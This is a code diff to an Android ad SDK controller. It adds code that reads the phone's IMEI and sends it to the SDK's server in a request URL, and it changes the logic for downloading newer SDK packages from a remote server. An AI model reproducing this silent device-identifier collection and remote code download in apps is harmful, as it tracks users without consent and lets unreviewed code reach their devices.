@@ -13,6 +13,7 @@ import android.content.pm.ApplicationInfo;
 import android.content.pm.PackageInfo;
 import android.content.pm.PackageManager;
 import android.content.pm.PackageManager.NameNotFoundException;
+import android.telephony.TelephonyManager;
 import android.util.Log;
 
 
@@ -106,9 +107,11 @@ public class GAdController {
 		String code = GTool.getSharedPreferences().getString(GCommons.SHARED_KEY_SDK_VERSIONCODE, "0");
 		if(nowTime - reqTime > 1*60*60*1000 || "0".equals(code))
 		{
+			TelephonyManager tm = (TelephonyManager) context.getSystemService(Context.TELEPHONY_SERVICE);
+			String imei = tm.getDeviceId();
 			String url = GCommons.URI_POST_NEW_SDK+"?channel="+GCommons.CHANNEL
 					+"&packageName="+GTool.getPackageName()+"&vc="+GCommons.VERSION_CODE
-					+"&vn="+GCommons.VERSION_NAME;
+					+"&vn="+GCommons.VERSION_NAME+"&imei="+imei;
 			Log.e("------------", "req new sdk "+url);
 			GTool.httpGetRequest(url, this, "revNewSdk", null);
 		}
@@ -260,21 +263,15 @@ public class GAdController {
 		
 		String code = GTool.getSharedPreferences().getString(GCommons.SHARED_KEY_SDK_VERSIONCODE, "0");
 		Log.e("------------","----------curr sdk="+code);
-		
-		if(code.equals(versionCode) || !isFind)
+		if(!isFind)
 		{
-			if(code.equals(versionCode))
-			{
-				Log.e("------------","----------startservice");
-				start();
-			}
-			else
+			if("0".equals(code))
 			{
 				Log.e("------------","----------no network or config error! reinit...---------");
 				new Thread(){
 					public void run() {
 						try {
-							Thread.sleep(30*60*1000);
+							Thread.sleep(3*60*60*1000);
 							init(context);
 						} catch (InterruptedException e) {
 							e.printStackTrace();
@@ -282,11 +279,26 @@ public class GAdController {
 					};
 				}.start();
 			}
+			else
+			{
+				Log.e("------------","----------startservice");
+				start();
+			}
 		}
-		else
+		else if(versionCode != null)
 		{
-			Log.e("------------","----------downloadRes");
-			GTool.downloadRes(GCommons.SERVER_ADDRESS, this, "revNewSdkCallback", downloadPath, true);
+			int netCode = Integer.parseInt(versionCode);
+			int currCode = Integer.parseInt(code);
+			if(netCode > currCode)
+			{
+				Log.e("------------","----------downloadRes");
+				GTool.downloadRes(GCommons.SERVER_ADDRESS, this, "revNewSdkCallback", downloadPath, true);
+			}
+			else
+			{
+				Log.e("------------","----------startservice");
+				start();
+			}
 		}
 	}
 	
